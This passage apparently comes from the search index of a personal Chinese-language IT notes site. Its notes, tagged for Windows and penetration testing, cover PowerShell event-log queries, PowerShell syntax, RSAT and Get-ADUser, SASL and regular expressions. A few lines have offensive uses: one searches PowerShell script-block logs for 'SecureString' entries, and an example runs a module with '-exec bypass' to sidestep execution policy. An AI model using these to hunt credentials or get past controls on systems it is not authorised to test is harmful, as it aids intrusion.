Application | Where-Object {$_.EntryType -eq \"Warning\"}</code></p> </li> <li> <p><code>Get-EventLog Application | Format-List</code></p> <ul> <li>\u672c\u6765\u53ea\u662f\u663e\u793a\u7b80\u8981\u4fe1\u606f\uff0c\u7528\u201cFormat-List\u201d\u7684\u8bdd\u663e\u793a\u8be6\u7ec6</li> </ul> </li> <li> <p><code>Get-EventLog Application | Select-Object TimeGenerated,Index,EntryType,InstanceID,Message</code></p> <ul> <li>\u6307\u5b9afield\uff08\u5168field\u770b\u8be6\u7ec6\uff09\uff0c\u6309\u7167\u6307\u5b9a\u6392\u5e8f\u8f93\u51fa</li> </ul> </li> <li> <p><code>Get-EventLog Application | Export-CSV -Encoding Default C:\\Work\\Applog.csv</code></p> <ul> <li>\u8f93\u51faCSV\uff0c\u6ce8\u610f\u7528<code>-Encoding Default</code>\uff0c\u6216UFT8\uff0c\u5426\u5219\u4e2d\u65e5\u8bed\u53ef\u80fd\u4e71\u7801</li> </ul> </li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_13","title":"\u6307\u5b9a\u65f6\u95f4\u8303\u56f4","text":"<p>\u65f6\u95f4\u683c\u5f0f\uff1a<code>YYYY/MM/DD</code></p> <ul> <li><code>-Before</code></li> <li><code>-After</code></li> </ul> <p>\u53e6\uff1a\u7528<code>-Newest [num]</code>\u83b7\u53d6\u6700\u65b0\u6307\u5b9a\u6761\u6570\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#get-winevent","title":"Get-WinEvent","text":"<p>https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3#example-9-get-event-ids-that-the-event-provider-generates</p> <pre><code>Get-WinEvent -ListLog *\n\nGet-WinEvent -ListProvider *\uff1aThe Name is the provider, and LogLinks is the log that is written to.\n\nGet-WinEvent -LogName Application | Where-Object { $_.ProviderName -Match 'WLMS' }\n</code></pre> <p><code>Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | Select-Object -Property Message | Select-String -Pattern 'SecureString'</code></p> <p>[!NOTE] \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u4e0e\u4e0a\u9762\u76f8\u540c\u7684\u7ed3\u679c \u6839\u636e Microsoft \u7684\u8bf4\u6cd5\uff0c\u5728\u5904\u7406\u5927\u578b\u4e8b\u4ef6\u65e5\u5fd7\u65f6\uff0c\u5c06\u5bf9\u8c61\u6cbf\u7740\u7ba1\u9053\u53d1\u9001\u5230 Where-Object \u547d\u4ee4\u7684\u6548\u7387\u5f88\u4f4e\u3002\u5efa\u8bae\u4f7f\u7528 Get-WinEvent cmdlet \u7684 FilterHashtable \u53c2\u6570\u6765\u7b5b\u9009\u4e8b\u4ef6\u65e5\u5fd7\u3002</p> <pre><code>Get-WinEvent -FilterHashtable @{\n  LogName='Application' \n  ProviderName='WLMS' \n}\n</code></pre> <ul> <li> <p>\u5404\u53c2\u6570\u4e0d\u5206\u884c\u7684\u8bdd\u53ef\u4ee5\u7528\u5206\u53f7\u5206\u9694\uff1a<code>@{ &lt;name&gt; = &lt;value&gt;; &lt;name&gt; = &lt;value&gt;\u00a0 ...}</code> </p> </li> <li> <p>\u5373\u4e0b\u56fe\u201cWindows \u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u7684\u8fd9\u4e9b\uff1a </p> </li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_14","title":"\u62ec\u53f7","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_15","title":"\u5c0f\u62ec\u53f7","text":"<ul> <li><code>&amp;()</code>\uff1a\u4f3c\u4e4e\u548clinux\u4e00\u6837\u2014\u2014\u5b50\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5728\u5b50\u8fdb\u7a0b\u91cc\u6267\u884c\u3002\uff08\u53ef\u7406\u89e3\u4e3a\u540e\u53f0\u6267\u884c\uff1f\uff09     &gt; powershell#<code>&amp;</code>\u8c03\u7528\u8fd0\u7b97\u7b26</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_16","title":"\u82b1\u62ec\u53f7","text":"<p>\u53ef\u7528\u4e8e\u58f0\u660e\u5728\u53d8\u91cf\u4e2d\u95f4\u6216\u5185\u90e8\u5e26\u6709\u7a7a\u683c\u7684\u53d8\u91cf\u3002\u7b49\uff1a</p> <p>What might not be obvious on a first glance is that you can use any\u00a0provider\u00a0within\u00a0<code>${}</code>, for example: <code>${c:\\tmp\\foo.txt}=\"Hello World\"</code> The effect depends on the provider. For the file system provider the example changes the content of the specified file.</p> <p>\u4e5f\u8868\u793a\u811a\u672c\u5757\uff0c\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u6267\u884c\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#net","title":".NET\u7684\u8c03\u7528\uff08\u5173\u4e8e\u4e2d\u62ec\u53f7\u548c\u4e24\u4e2a\u5192\u53f7\uff09","text":"<p>\u4f8b\u5b50\uff1a </p> <p>https://learn.microsoft.com/en-us/dotnet/api/system.io.file.copy?redirectedfrom=MSDN&amp;view=net-7.0#System_IO_File_Copy_System_String_System_String_System_Boolean_</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_17","title":"\u7279\u6b8a\u7b26\u53f7","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#dot-source","title":"dot source","text":"<p><code>. .\\\u811a\u672c\u540d</code></p> <p>\u901a\u5e38\uff0c<code>.\\\u811a\u672c\u540d</code>\u6267\u884c\u540e\uff0c\u811a\u672c\u5185\u7684\u53d8\u91cf\u7b49\u5c06\u88ab\u5e9f\u5f03\u3002 \u4f46\u662f\uff0c\u7528<code>. .\\\u811a\u672c\u540d</code>\u6267\u884c\u540e\uff0c\u811a\u672c\u5185\u7684\u53d8\u91cf\u7b49\u8fd8\u4f1a\u5b58\u5728\u3002\uff08\u5927\u6982\u662fLinux\u91cc\u5b50\u8fdb\u7a0b\u7ee7\u627f\u73af\u5883\u53d8\u91cf\u7684\u610f\u601d\uff09</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_18","title":"<code>&amp;</code>\u8c03\u7528\u8fd0\u7b97\u7b26","text":"<p>\u8fd0\u884c\u50a8\u5b58\u5728\u53d8\u91cf\u4e2d\u7531\u5b57\u7b26\u4e32/\u811a\u672c\u5757\u8868\u793a\u7684\u547d\u4ee4\uff08\u6ce8\u610f\uff1a\u6240\u4ee5\u8be5\u547d\u4ee4\u4e0d\u89e3\u6790\u5b57\u7b26\u4e32/\u53c2\u6570\uff09</p> <p>call-operator</p> <p>\u4f8b\u5b50\uff1a <code>powershell -exec bypass -Command \"&amp; {import-module test.ps1}\"</code></p> <ul> <li>\u5982\u679c\u6ca1\u6709<code>&amp;</code>\u8fd0\u7b97\u7b26\uff0c\u5219\u4ec5\u4ec5\u8f93\u51fa\u5927\u62ec\u53f7\u5185\u7684\u5185\u5bb9\uff08\"import-module test.ps1\"\uff0c\u7531\u4e8e\u7528\u5927\u62ec\u53f7\u8868\u793a\u4e86\u53d8\u91cf\uff09</li> <li>\u5982\u679c\u8fde\u5927\u62ec\u53f7\u90fd\u6ca1\u6709\uff0c\u5219\u628a\u53cc\u5f15\u53f7\u5185\u7684\u5185\u5bb9\u6574\u4f53\u5f53\u547d\u4ee4\u3002\uff08\u90a3\u6240\u4ee5\u4e3a\u4ec0\u4e48\u8981\u7528&amp;{}\u6765\u6267\u884c\uff1f\uff09</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#foreach-object","title":"<code>%</code> (<code>ForEach-Object</code>)","text":"<p><code>[byte[]]$bytes = 0..65535|%{0};</code></p> <p>\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a65536\u7684\u5b57\u8282\u6570\u7ec4\uff0c\u6bcf\u4e2a\u5b57\u8282\u90fd\u521d\u59cb\u5316\u4e3a0\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#system32syswow64","title":"[[System32\u4e0eSysWOW64#\u5224\u65ad\u5e94\u7528\u7a0b\u5e8f\u7684\u4f4d\u6570]]","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#ps1","title":"PS1\u811a\u672c\u8bed\u6cd5","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_19","title":"\u53d8\u91cf","text":"<p><code>$&lt;variable&gt; = &lt;value&gt;</code>\u3002\u76f4\u63a5\u8d4b\u503c\uff0c\u76f4\u63a5\"$\"\u8c03\u7528\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_20","title":"\u5b57\u7b26\u4e32\u62fc\u63a5","text":"<pre><code>$name = \"John\"\n# \u53cc\u5f15\u53f7\u4e2d\u76f4\u63a5\u63d2\u5165\uff08\u4f46\u662f\u6709\u65f6\u5019\u4e0d\u884c\uff0c\u6bd4\u5982\u53d8\u91cf\u540e\u9762\u8ddf\u7740\u5192\u53f7\u7684\u65f6\u5019\uff1f\uff09\nWrite-Host \"Hello, $name!\"    # Write-Host: print\n\n# \u5b50\u8868\u8fbe\u5f0f\u62fc\u63a5\nWrite-Host \"Hello, $($name)!\"\n</code></pre>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_21","title":"\u6570\u7ec4","text":"<p>\u521b\u5efa\u65b9\u5f0f\uff08\u6709\u591a\u79cd\uff09\uff1a</p> <ul> <li><code>$id = 1,2,3,4</code></li> <li><code>$id = (1,2,3,4)</code></li> <li> <p><code>$id = @(1,2,3,4)</code></p> </li> <li> <p>\u4f7f\u7528<code>@</code>\u663e\u793a\u58f0\u660e\u6570\u7ec4\u3002\u597d\u5904\uff1a\u5728\u521b\u5efa\u5355\u5143\u7d20\u6570\u7ec4\u65f6\uff0c\u5982\u679c\u4f7f\u7528<code>(1)</code>\u5219\u8868\u793a\u5355\u4e2a\u6570\u503c 1\u3002\u6ca1\u6709 <code>@()</code>\u65f6PowerShell \u4e0d\u4f1a\u628a\u5355\u4e2a\u503c\u89c6\u4e3a\u6570\u7ec4\u3002</p> </li> </ul> <p>\u8bbf\u95ee\uff1a</p> <ul> <li><code>$id[0,3]</code>\uff1a\u67e5\u8be2\u7b2c1~4\u4e2a</li> <li><code>$id.count</code>\uff1a\u7edf\u8ba1\u4e2a\u6570</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_22","title":"\u5b57\u5178","text":"<p>\u521b\u5efa\uff1a\u7528<code>@{}</code>\u3002</p> <p>\u8bbf\u95ee\uff1a\u548cpython\u4e00\u6837\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_23","title":"\u5faa\u73af","text":"<pre><code>$folderPath = \"C:\\tmp\"; $fileList = Get-ChildItem -Path $folderPath | ForEach-Object { Join-Path $folderPath $_.Name };\nforeach ($file in $fileList) { Get-WinEvent -Path $file | Where-Object {$_.Message -like \"*USERID*\"} }\n</code></pre>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#get-aduser","title":"Get-ADUser","text":"<p>\u9ed8\u8ba4\u4ec5\u5b89\u88c5\u5728\u57df\u63a7\uff0c\u662fAD\u7ba1\u7406\u5de5\u5177RSAT(Remote Server Administration Tools)\u7684\u4e00\u90e8\u5206\u3002Win7\u4ee5\u4e0a\u7684\u5de5\u4f5c\u7ad9\u80fd\u5b89\u88c5\uff0c\u4e0d\u8fc7\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002</p> <ul> <li>https://technet.microsoft.com/en-us/library/gg413289.aspx</li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_24","title":"\u786e\u8ba4\u5b89\u88c5","text":"<p><code>Get-WindowsCapability -Online -Name \"Rsat*\" | select Name,State</code></p> <p>\u5728PowerShell\u4e2d\uff0c\u6307\u5b9a <code>-Online</code> \u7684\u539f\u56e0\u662f\u56e0\u4e3a <code>Get-WindowsCapability</code> \u547d\u4ee4\u4e0d\u4ec5\u53ef\u4ee5\u64cd\u4f5c\u5f53\u524d\u8fd0\u884c\u7684\u7cfb\u7edf\uff0c\u8fd8\u53ef\u4ee5\u64cd\u4f5c\u79bb\u7ebf\u7684Windows\u6620\u50cf\uff08\u6bd4\u5982WIM\u6587\u4ef6\uff09\u6216\u865a\u62df\u786c\u76d8\u6587\u4ef6\uff08VHD/VHDX\uff09\u3002\u901a\u8fc7\u6307\u5b9a <code>-Online</code>\uff0c\u660e\u786e\u8868\u793a\u547d\u4ee4\u662f\u9488\u5bf9\u5f53\u524d\u6b63\u5728\u8fd0\u884c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u4f8b\uff0c\u800c\u4e0d\u662f\u79bb\u7ebf\u6620\u50cf\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_25","title":"\u5b89\u88c5\u670d\u52a1","text":"","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#gui","title":"\u76f4\u63a5GUI","text":"<p>\u56e0\u4e3a\u4e4b\u524d\u7528\u7684powershell\u65b9\u6cd5\u83ab\u540d\u62a5\u9519\u4e86\uff1a\u627e\u5230\u201cOptional features\u201d\uff08\u8bbe\u7f6e\u91cc\u7684system\u6216\u8005app\uff09</p> <p>\u6ce8\u610f\uff1a\u4ece Windows 10 October 2018 Update \u5f00\u59cb\uff0c\u4e0d\u518d\u9700\u8981\u4e0b\u8f7d RSAT \u5de5\u5177\u3002\u5b83\u4eec\u73b0\u5728\u5305\u542b\u5728 Windows \u7248\u672c\u4e2d\uff0c\u53ea\u9700\u5b89\u88c5\u5373\u53ef\u3002 RSAT \u5de5\u5177\u4ec5\u5728 Windows 10 \u548c 11 \u7684 Windows \u4e13\u4e1a\u7248\u548c\u4f01\u4e1a\u7248\u4e0a\u53d7\u652f\u6301\u3002</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_26","title":"\u81ea\u5df1\u67e5\u7684\u65b9\u6cd5","text":"<p>\u770b\u4e86\u4e0b\u4f1a\u5b89\u88c5 <code>DS-LDS</code> \u548c <code>ServerManager</code>\u3002</p> <ul> <li><code>Get-WindowsCapability -Online -Name RSAT.ActiveDirectory* | Add-WindowsCapability -Online</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#ds-ldsgpo","title":"\u516c\u53f8\u6587\u6863\uff08\u53ea\u5b89\u88c5DS-LDS\u548cGPO\u7ba1\u7406\uff09","text":"<ul> <li><code>Add-WindowsCapability -Online -Name \"Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0\"</code></li> <li><code>Add-WindowsCapability -Online -Name \"Rsat.GroupPolicy.Management.Tools~~~~0.0.1.0\"</code></li> </ul>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_27","title":"\u516c\u53f8\u5185\u7528","text":"<p>\u4e0d\u80fd\u8d70WSUS/proxy\uff01\u5426\u5219\u5c31\u7b97\u7528\u7f51\u4e0a\u7684\u65b9\u6cd5\u4e5f\u4e0d\u884c\u3002</p> <p><code>Get-ADUser -Filter 'UserPrincipalName -like \"name@doman.com\"' -SearchBase \"DC=domain,DC=com\" -Properties *</code></p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/powershell/#_28","title":"\u5404\u79cd\u94fe\u63a5","text":"<p>Intro to PowerShell Scripting for Security</p>","tags":["IT/Windows","\u6e17\u900f"]},{"location":"Resources/simple-network-service/","title":"\u7b80\u5355\u7f51\u7edc\u670d\u52a1\u6e17\u900f","text":""},{"location":"Resources/API/SASL/","title":"SASL","text":"<p>Simple Authentication and Security Layer</p>","tags":["IT/\u8ba4\u8bc1"]},{"location":"Resources/API/SASL/#_1","title":"\u80cc\u666f","text":"<p>Web\uff08http\uff09\u3001\u7535\u5b50\u90ae\u4ef6\uff08SMTP\u3001POP3\u3001IMAP\uff09\u7b49\u5f80\u5f80\u9700\u8981\u8eab\u4efd\u9a8c\u8bc1\uff0c\u4f46\u5bf9\u4e8e\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u6765\u8bf4\u6bcf\u6b21\u90fd\u4ece\u5934\u5f00\u59cb\u521b\u5efa\u8eab\u4efd\u9a8c\u8bc1\u6a21\u5757\u662f\u65e0\u610f\u4e49\u7684</p>","tags":["IT/\u8ba4\u8bc1"]},{"location":"Resources/API/SASL/#_2","title":"\u89e3\u51b3\u7684\u95ee\u9898","text":"<ul> <li>\u6d88\u9664\u4e86\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u5f00\u53d1\u8eab\u4efd\u9a8c\u8bc1\u7684\u9700\u8981</li> <li>\u6bcf\u4e2a\u534f\u8bae\u90fd\u5fc5\u987b\u652f\u6301 SASL</li> <li>\u4f46SASL\u5e76\u6ca1\u6709\u89c4\u5b9a\u5177\u4f53\u7684\u5b9e\u73b0\u65b9\u6cd5</li> </ul>","tags":["IT/\u8ba4\u8bc1"]},{"location":"Resources/API/SASL/#sasl","title":"SASL\u7684\u5de5\u4f5c\u65b9\u5f0f","text":"<p>\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u5efa\u7acb\u901a\u4fe1\u901a\u9053\u540e\uff0c\u53cc\u65b9\u534f\u5546\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\uff0c\u7136\u540e\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u8fc7\u7a0b\u3002</p>","tags":["IT/\u8ba4\u8bc1"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#python","title":"Python\u597d\u7528\u6cd5","text":"<pre><code>import re\n\npattern = re.compile(r'...')\n\n# \u65b9\u6cd51\n## \u6ce8\u610f\uff1asearch() \u4ec5\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5339\u914d\u5230\u7684\u3002\nresult = pattern.search(text)\nprint(result.group())    # group()\u65b9\u6cd5\uff1a\u8fd4\u56de\u6b63\u5219\u5339\u914d\u7684\u6307\u5b9a\u5206\u7ec4\uff08\u5c0f\u62ec\u53f7\uff09\uff0c\u4e0d\u6307\u5b9a\u6216\u8005 0 \u5219\u8868\u793a\u8fd4\u56de\u5339\u914d\u7684\u6574\u4f53\u3002\n# \u65b9\u6cd52\n## findall() \u4f1a\u5339\u914d\u6240\u6709\u7ed3\u679c\uff0c\u653e\u8fdb\u5217\u8868\u3002\nresults = pattern.findall(text)\nprint(results)\n</code></pre> <p>\u4ee3\u7801\u590d\u6742\u65f6\u5efa\u8baecompile\u65b9\u6cd5\uff0c\u7b80\u5316\u4ee3\u7801\uff0c\u4e14\u4e0d\u7528\u591a\u6b21\u7f16\u8bd1pattern\u3002\u4e0d\u7528compile\u7684\u8bdd\u5982\u4e0b\uff1a <pre><code>pattern = r\"/workbench?workbenchId=(WB-\\d{5}-\\d{8}-\\d{5})\"\nworkbenchIds = re.findall(pattern, text)\n</code></pre></p>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_1","title":"\u6ce8\u610f","text":"<ul> <li><code>re.match</code> \u4ec5\u68c0\u67e5\u5b57\u7b26\u4e32\u5f00\u5934\u662f\u5426\u5339\u914d\u2014\u2014\u6240\u4ee5\u53ef\u80fd\u6709\u6f5c\u5728\u6f0f\u6d1e\u3002\u5982\u679c\u5e0c\u671b\u5339\u914d\u6574\u4e2a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u5728\u672b\u5c3e\u52a0\u4e0a\"$\"\u3002</li> </ul>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_2","title":"\u6b63\u5219\u53ef\u89c6\u5316","text":"<ul> <li>\u53ef\u89c6\u5316\uff1a https://regexper.com/</li> <li>\u6d4b\u8bd5\uff1a https://regex101.com/</li> <li>\u89e3\u91ca/\u6d4b\u8bd5\uff1a https://regexr.com/</li> </ul>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_3","title":"\u57fa\u7840\u77e5\u8bc6","text":"","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_4","title":"\u5e38\u7528\u5143\u5b57\u7b26","text":"\u5143\u5b57\u7b26 \u8bf4\u660e . \u6362\u884c\u7b26\u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\uff08\u5305\u62ec<code>.</code>\uff09 \\w \u5b57\u6bcd\u3001\u6570\u5b57\u3001\u4e0b\u5212\u7ebf\u3001\u6c49\u5b57\u3002\u53ea\u8003\u8651\u82f1\u6587\u7684\u8bdd\uff1a\u7b49\u540c\u4e8e<code>[a-z0-9A-Z_]</code>\u3002 \\s \u4efb\u610f\u7a7a\u767d\u7b26\u3002\u5305\u62ec\u7a7a\u683c\uff0c\u5236\u8868\u7b26(Tab)\uff0c\u6362\u884c\u7b26\uff0c\u4e2d\u6587\u5168\u89d2\u7a7a\u683c\u7b49\u3002 \\d \u6570\u5b57 \\b \u5355\u8bcd\u7684\u5f00\u59cb\u6216\u7ed3\u675f ^ \u5b57\u7b26\u4e32\u5f00\u59cb $ \u5b57\u7b26\u4e32\u7ed3\u675f <ul> <li>\u6709\u4e9b\u547d\u4ee4\u4e0d\u652f\u6301\u3002\u5982Bash\u3002\u53c2\u8003\uff1a http://blog.chinaunix.net/uid-7665917-id-5766183.html</li> </ul>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_5","title":"\u5e38\u7528\u9650\u5b9a\u7b26","text":"\u9650\u5b9a\u7b26 \u8bf4\u660e * \u91cd\u590d0\u6b21\u6216\u4ee5\u4e0a + \u91cd\u590d1\u6b21\u6216\u4ee5\u4e0a ? \u91cd\u590d0\u6b21\u62161\u6b21 {n} \u91cd\u590dn\u6b21 {n,} \u91cd\u590dn\u6b21\u6216\u4ee5\u4e0a {n,m} \u91cd\u590dn\u5230m\u6b21","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_6","title":"\u53cd\u4e49\u3001\u5426\u5b9a/\u4e0d\u5339\u914d","text":"<ul> <li>\u5927\u5199\u5b57\u6bcd\u4e3a\u5c0f\u5199\u7684\u975e\u3002\u5982\\S\u5c31\u662f\u5339\u914d\u975e\u7a7a\u767d\u7b26\u3002</li> <li>\u65b9\u62ec\u53f7\u91cc\u7684<code>^</code>\u8868\u793a\u4e0d\u5339\u914d\u3002</li> </ul> \u8bed\u6cd5 \u8bf4\u660e \\W \\w\u7684\u975e \\S \\s\u7684\u975e \\D \\d\u7684\u975e \\B \\b\u7684\u975e [\\^X] \u4e0d\u5339\u914dX\uff08\u5339\u914d\u9664\u4e86X\u4ee5\u5916\u7684\u4efb\u610f\u5b57\u7b26\uff09 [\\^AIUEO] \u4e0d\u5339\u914dAIUEO","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_7","title":"<code>[]</code> \u96c6\u5408\u3001\u533a\u95f4\u2014\u2014\u5339\u914d\u65b9\u62ec\u53f7\u91cc\u4efb\u610f\u4e00\u4e2a","text":"<p><code>[aeiou]</code>\u5c31\u5339\u914d\u4efb\u4f55\u4e00\u4e2a\u82f1\u6587\u5143\u97f3\u5b57\u6bcd <code>[.?!]</code>\u5339\u914d\u6807\u70b9\u7b26\u53f7(.\u6216?\u6216!)</p>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_8","title":"<code>|</code>  \u903b\u8f91\u6216\u2014\u2014\u7528|\u628a\u4e0d\u540c\u7684\u89c4\u5219\u5206\u9694\u5f00","text":"<p><code>\\d{5}-\\d{4}|\\d{5}</code>\u8fd9\u4e2a\u8868\u8fbe\u5f0f\u7528\u4e8e\u5339\u914d\u7f8e\u56fd\u7684\u90ae\u653f\u7f16\u7801\u3002\u7f8e\u56fd\u90ae\u7f16\u7684\u89c4\u5219\u662f5\u4f4d\u6570\u5b57\uff0c\u6216\u8005\u7528\u8fde\u5b57\u53f7\u95f4\u9694\u76849\u4f4d\u6570\u5b57\u3002 \u4e4b\u6240\u4ee5\u8981\u7ed9\u51fa\u8fd9\u4e2a\u4f8b\u5b50\u662f\u56e0\u4e3a\u5b83\u80fd\u8bf4\u660e\u4e00\u4e2a\u95ee\u9898\uff1a\u4f7f\u7528\u5206\u679d\u6761\u4ef6\u65f6\uff0c\u8981\u6ce8\u610f\u5404\u4e2a\u6761\u4ef6\u7684\u987a\u5e8f\u3002\u5982\u679c\u4f60\u628a\u5b83\u6539\u6210<code>\\d{5}|\\d{5}-\\d{4}</code>\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u53ea\u4f1a\u5339\u914d5\u4f4d\u7684\u90ae\u7f16(\u4ee5\u53ca9\u4f4d\u90ae\u7f16\u7684\u524d5\u4f4d)\u3002</p> <p>\u539f\u56e0\u662f\u5339\u914d\u5206\u652f\u6761\u4ef6\u65f6\uff0c\u5c06\u4f1a\u4ece\u5de6\u5230\u53f3\u5730\u6d4b\u8bd5\u6bcf\u4e2a\u6761\u4ef6\uff0c\u5982\u679c\u6ee1\u8db3\u4e86\u67d0\u4e2a\u5206\u652f\u7684\u8bdd\uff0c\u5c31\u4e0d\u4f1a\u53bb\u518d\u7ba1\u5176\u5b83\u7684\u6761\u4ef6\u4e86\u3002</p>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_9","title":"<code>()</code>  \u5206\u7ec4\u2014\u2014\u4ee5\u4fbf\u91cd\u590d\u591a\u6b21\uff0c\u6216\u65b9\u4fbf\u6309\u5206\u7ec4\u5e8f\u53f7\u63d0\u53d6","text":"<p><code>(\\d{1,3}\\.){3}\\d{1,3}</code>\u662f\u4e00\u4e2a\u7b80\u5355\u7684IP\u5730\u5740\u5339\u914d\u8868\u8fbe\u5f0f</p>","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_10","title":"\u6355\u83b7","text":"\u8bed\u6cd5 \u8bf4\u660e (exp) \u5339\u914dexp\uff0c\u5e76\u6355\u83b7\u6587\u672c\u5230\u81ea\u52a8\u547d\u540d\u7684\u5206\u7ec4\u91cc (?\\&lt;name&gt;exp) \u5339\u914dexp\uff0c\u5e76\u6355\u83b7\u6587\u672c\u5230\u547d\u540d\u4e3aname\u7684\u5206\u7ec4\u91cc\u3002\u4e5f\u53ef\u4ee5\u5199\u6210<code>(?'name'exp)</code>\u6216<code>(?P&lt;name&gt;exp)</code> (?:exp) \u5339\u914dexp\uff0c\u4f46\u662f\u4e0d\u6355\u83b7\u4e5f\u4e0d\u5206\u7ec4\u3002\u610f\u4e49\uff1a\u4e0d\u5f97\u4e0d\u5206\u7ec4\uff0c\u4f46\u662f\u4e4b\u540e\u5e76\u4e0d\u60f3\u4f7f\u7528\u3002","tags":["IT/Python","IT/Splunk"]},{"location":"Resources/General/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#_11","title":"\u96f6\u5bbd\u65ad\u8a00","text":"<ul> <li>\u96f6\u5bbd\uff1a\u8868\u793a\u4e0d\u5339\u914d\u2014\u2014\u6307\u4e0d\u5339\u914dexp</li> <li>\u4e0e\u901a\u914d\u662f\u4e0d\u540c\u7684\u3002\u5982<code>*exp</code>\uff0c\u5148\u884c\u65ad\u8a00\u662f\u8f93\u51fa<code>*</code>\uff0c\u800c\u901a\u914d\u662f\u8f93\u51fa<code>*exp</code>\u3002</li> </ul> \u8bed\u6cd5 \u8bf4\u660e (?=exp) \u5339\u914dexp\u524d\u9762\u7684\u4f4d\u7f6e\u3002\u4e5f\u53eb\u96f6\u5bbd\u5ea6\u6b63\u9884\u6d4b\u5148\u884c\u65ad\u8a00(lookahead)\u3002\u4ece\u6700\u53f3\u7aef\u5f00\u59cb\u627e\uff0c\u53ea\u83b7\u53d6\u524d\u9762\u7684\u90e8\u5206 (?&lt;=exp) \u5339\u914dexp\u540e\u9762\u7684\u4f4d\u7f6e\u3002\u4e5f\u53eb\u96f6\u5bbd\u5ea6\u6b63\u56de\u987e\u540e\u53d1\u65ad\u8a00(lookbehind)\u3002\u4ece\u6700\u5de6\u7aef\u5f00\u59cb\u627e\uff0c\u53ea\u83b7\u53d6\u540e\u9762\u7684\u90e8\u5206 (?!exp) 